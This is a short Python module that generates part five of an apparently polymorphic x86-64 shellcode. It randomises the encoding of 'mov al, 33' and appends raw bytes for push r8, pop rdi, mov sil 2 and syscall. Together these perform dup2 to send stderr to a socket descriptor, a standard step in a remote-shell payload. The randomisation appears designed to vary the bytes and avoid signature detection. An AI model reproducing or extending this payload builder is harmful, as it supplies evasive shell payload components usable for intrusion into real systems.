#!/usr/bin/env python3
import random
from func_instu import *

def partie5():

    x = random.randint(0, 1)

    if x == 0:
        resultat = movxl('al', 33)
    else :
        rdmxor = randomxor('al')
        moval = movxl('al', 33)
        resultat = rdmxor + moval

    pushr8 = '\\x41\\x50' # push r8
    poprdi = '\\x5f' # pop rdi
    movsil = '\\x40\\xb6\\x02' # mov sil, 2
    syscall = '\\x0f\\x05' # syscall

    resultat_concat = resultat + pushr8 + poprdi + movsil + syscall
    
    print("partie 5:", resultat_concat)
    print("")

    return resultat_concat